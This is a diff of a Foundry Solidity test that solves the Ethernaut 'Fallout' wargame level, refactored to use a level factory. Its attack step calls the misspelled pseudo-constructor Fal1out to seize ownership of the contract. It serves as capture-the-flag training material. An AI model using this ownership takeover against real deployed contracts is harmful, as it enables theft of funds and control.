@@ -2,21 +2,35 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "../src/2-Fallout.sol";
+import "./utils/BaseTest.sol";
+import "../src/Ethernaut.sol";
+import "../src/levels/2-Fallout/Fallout.sol";
+import "../src/levels/2-Fallout/FalloutFactory.sol";
 
-contract FalloutTest is Test {
-    Fallout public falloutCTF;
+contract FalloutTest is Test, BaseTest {
+    Fallout public level;
 
-    function setUp() public {
-        falloutCTF = new Fallout();
+    constructor() {
+        levelFactory = new FalloutFactory();
+    }
+
+    function setUp() public override {
+        super.setUp();
+        levelAddr = payable(_createLevelInstance());
+        level = Fallout(levelAddr);
     }
 
     function testAttack() public {
-        // initialize the contract & claim ownership
-        falloutCTF.Fal1out{value: 0.0001 ether}();
-
-        assertEq(falloutCTF.owner(), address(this));
+        _attack();
+        _validateLevel();
     }
 
-    receive() external payable {}
+    function _attack() internal override {
+        vm.startPrank(attacker);
+
+        // 1. Initialize the contract & claim ownership
+        level.Fal1out{value: 0.0001 ether}();
+
+        vm.stopPrank();
+    }
 }
